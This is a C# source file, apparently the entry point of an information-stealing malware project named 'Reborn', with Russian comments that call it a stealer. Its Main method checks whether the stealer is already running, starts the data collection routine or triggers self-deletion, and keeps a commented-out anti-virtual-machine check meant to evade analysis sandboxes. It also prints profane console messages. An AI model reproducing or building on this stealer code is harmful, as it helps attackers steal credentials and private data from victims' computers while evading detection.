using Natasha.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace Reborn
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                //if (!AntiVM.Inizialize()) // Антивиртуалка
                //{
                    if (!File.Exists(Help.DirectoryBuild + Config.ID)) // Проверка запущен ли уже стиллер
                    {
                        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли  уже стиллер
                        {
                            Collection.Start();
                        }
                        else
                        {
                            Console.WriteLine("3");
                            Sending.AutoDelete();
                        }
                    }
                    else
                    {
                        Console.WriteLine("2");
                        Sending.AutoDelete();
                    }
                //}
                //else
                //{
                //    Console.WriteLine("1");
                //    Sending.AutoDelete();
                //}
                Console.WriteLine("Ахуеть спасиба");
            }
            catch(Exception e)
            {
                Console.WriteLine(e + "ОХУЕТЬ, ОШИБКА ПРЯМ В ПРОГРАМ");
            }
        }
    }
}
